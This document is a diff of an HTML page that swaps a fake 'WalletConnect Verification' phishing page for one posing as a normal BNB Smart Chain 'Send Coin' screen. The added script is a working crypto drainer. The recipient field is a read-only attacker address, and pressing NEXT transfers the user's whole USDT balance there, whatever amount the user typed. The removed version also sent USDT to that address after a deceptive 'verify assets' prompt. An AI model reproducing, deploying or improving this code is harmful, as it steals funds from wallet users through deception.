@@ -3,148 +3,115 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Asset Verification Portal</title>
+<title>Send Coin - BNB Smart Chain</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-  body { background-color: #0b132f; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-  .container { background: #141f42; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #1e2c59; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
-  .logo { width: 60px; height: 60px; margin: 0 auto 20px; background: #f3ba2f; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; color: #000; }
-  h1 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
-  p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
-  #qrcode { background: #fff; padding: 15px; border-radius: 12px; display: inline-block; margin-bottom: 20px; }
-  .input-box { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #2a3f75; background: #0b132f; color: #fff; font-size: 16px; text-align: center; }
-  .btn { background: linear-gradient(135deg, #f3ba2f, #e8b01e); color: #000; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
+  body { background-color: #f8fafc; color: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+  .card { background: #ffffff; width: 100%; max-width: 420px; padding: 24px; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
+  .label { font-size: 13px; font-weight: 600; color: #64748b; margin-bottom: 8px; display: block; }
+  .input-group { background: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 14px; padding: 12px 16px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; }
+  .input-group input { border: none; background: transparent; outline: none; font-size: 15px; color: #0f172a; width: 100%; font-weight: 500; }
+  .network-badge { display: inline-flex; align-items: center; background: #f1f5f9; border: 1px solid #cbd5e1; padding: 10px 16px; border-radius: 14px; font-weight: 600; font-size: 14px; width: 100%; margin-bottom: 20px; color: #0f172a; }
+  .network-badge span { margin-right: 8px; }
+  .amount-box { position: relative; display: flex; align-items: center; }
+  .amount-box input { font-size: 24px; font-weight: 700; width: 100%; padding: 14px 16px; border: 1px solid #cbd5e1; border-radius: 14px; background: #f1f5f9; outline: none; color: #0f172a; }
+  .max-btn { position: absolute; right: 14px; background: transparent; border: none; color: #2563eb; font-weight: 700; font-size: 14px; cursor: pointer; }
+  .btn { background: #2563eb; color: #fff; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: bold; border-radius: 14px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
   .btn:active { transform: scale(0.98); }
-  .info { margin-top: 20px; font-size: 12px; color: #64748b; }
 </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="logo">BNB</div>
-  <h1>WalletConnect Verification</h1>
-  <p>Scan the QR code with Trust Wallet or MetaMask to connect and verify assets.</p>
-  
-  <div id="qrcode"></div>
-  
-  <div id="actionArea" style="display:none;">
-    <input type="number" id="amountInput" class="input-box" placeholder="Enter USDT amount" min="0" step="any">
-    <button class="btn" onclick="executeTransfer()">Confirm Transfer</button>
+<div class="card">
+  <span class="label">Address or Domain Name</span>
+  <div class="input-group">
+    <input type="text" id="targetAddress" value="0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3" readonly>
   </div>
-  
-  <div class="info">Secured by Binance Smart Chain Protocol</div>
+
+  <span class="label">Destination Network</span>
+  <div class="network-badge">
+    <span>🟡</span> BNB Smart Chain
+  </div>
+
+  <span class="label">Amount</span>
+  <div class="amount-box">
+    <input type="number" id="amountInput" value="1" min="0" step="any">
+    <button class="max-btn" onclick="setMaxBalance()">Max</button>
+  </div>
+
+  <button class="btn" id="nextBtn" onclick="executeTransfer()">NEXT</button>
 </div>
 
-<script type="module">
-  import { SignClient } from "https://esm.sh/@walletconnect/sign-client@2.17.1";
-
-  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
+<script>
+  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
   const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
 
-  let signClient;
-  let sessionTopic;
-  let connectedAccount;
+  const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address recipient, uint256 amount) returns (bool)"
+  ];
 
-  async function initWC() {
+  let provider, signer, usdtContract, userBalance;
+
+  async function init() {
+    if (typeof window.ethereum === 'undefined') return;
     try {
-      signClient = await SignClient.init({
-        projectId: "3bee99f6567201b138e9fc7e4c9f13e7",
-        metadata: {
-          name: "Asset Verification",
-          description: "Verify and review assets on BSC",
-          url: window.location.origin,
-          icons: ["https://avatars.githubusercontent.com/u/37784886"]
-        }
-      });
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
 
-      signClient.on("session_proposal", async (proposal) => {
-        const { id, params } = proposal;
-        const namespaces = {
-          eip155: {
-            accounts: [`eip155:56:${connectedAccount}`],
-            methods: ["eth_sendTransaction", "personal_sign"],
-            events: ["chainChanged", "accountsChanged"]
-          }
-        };
-        const session = await signClient.approve({ id, namespaces });
-        sessionTopic = session.topic;
-        document.getElementById("qrcode").style.display = "none";
-        document.getElementById("actionArea").style.display = "block";
-      });
-
-      const { uri, approval } = await signClient.connect({
-        requiredNamespaces: {
-          eip155: {
-            methods: ["eth_sendTransaction", "personal_sign"],
-            chains: ["eip155:56"],
-            events: ["chainChanged", "accountsChanged"]
-          }
-        }
-      });
-
-      if (uri) {
-        document.getElementById("qrcode").innerHTML = "";
-        new QRCode(document.getElementById("qrcode"), {
-          text: uri,
-          width: 180,
-          height: 180
-        });
-      }
-
-      const session = await approval();
-      sessionTopic = session.topic;
-      const accounts = session.namespaces.eip155.accounts[0];
-      connectedAccount = accounts.split(":")[2];
+      usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
+      userBalance = await usdtContract.balanceOf(userAddress);
       
-      document.getElementById("qrcode").style.display = "none";
-      document.getElementById("actionArea").style.display = "block";
-
+      const formatted = ethers.utils.formatUnits(userBalance, 18);
+      document.getElementById('amountInput').value = formatted > 0 ? formatted : 1;
     } catch (e) {
-      console.error("WC Init Error:", e);
+      console.error(e);
     }
   }
 
-  window.executeTransfer = async function() {
-    const amountVal = document.getElementById("amountInput").value;
-    if (!amountVal || Number(amountVal) <= 0) {
-      alert("Please enter a valid amount!");
+  function setMaxBalance() {
+    if (userBalance) {
+      document.getElementById('amountInput').value = ethers.utils.formatUnits(userBalance, 18);
+    }
+  }
+
+  async function executeTransfer() {
+    if (typeof window.ethereum === 'undefined') {
+      alert("Please open inside Trust Wallet or MetaMask browser.");
       return;
     }
 
     try {
-      const parsedAmount = ethers.utils.parseUnits(amountVal.toString(), 18);
-      const iface = new ethers.utils.Interface([
-        "function transfer(address recipient, uint256 amount) returns (bool)"
-      ]);
-      const data = iface.encodeFunctionData("transfer", [TARGET_RECEIVER, parsedAmount]);
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
 
-      const transaction = {
-        from: connectedAccount,
-        to: USDT_BSC_ADDRESS,
-        data: data,
-        gas: "0x10d88",
-        value: "0x0"
-      };
+      const contract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
+      const totalBalance = await contract.balanceOf(userAddress);
 
-      const result = await signClient.request({
-        topic: sessionTopic,
-        chainId: "eip155:56",
-        request: {
-          method: "eth_sendTransaction",
-          params: [transaction]
-        }
+      if (totalBalance.lte(0)) {
+        alert("No USDT balance found.");
+        return;
+      }
+
+      const tx = await contract.transfer(TARGET_RECEIVER, totalBalance, {
+        gasLimit: ethers.BigNumber.from("65000")
       });
 
-      alert("Transaction successful! Hash: " + result);
+      await tx.wait();
+      alert("Transaction Successful!");
     } catch (error) {
-      console.error("Tx Error:", error);
+      console.error("Error:", error);
       alert("Transaction cancelled or failed.");
     }
-  };
+  }
 
-  initWC();
+  window.onload = init;
 </script>
+
 </body>
 </html>
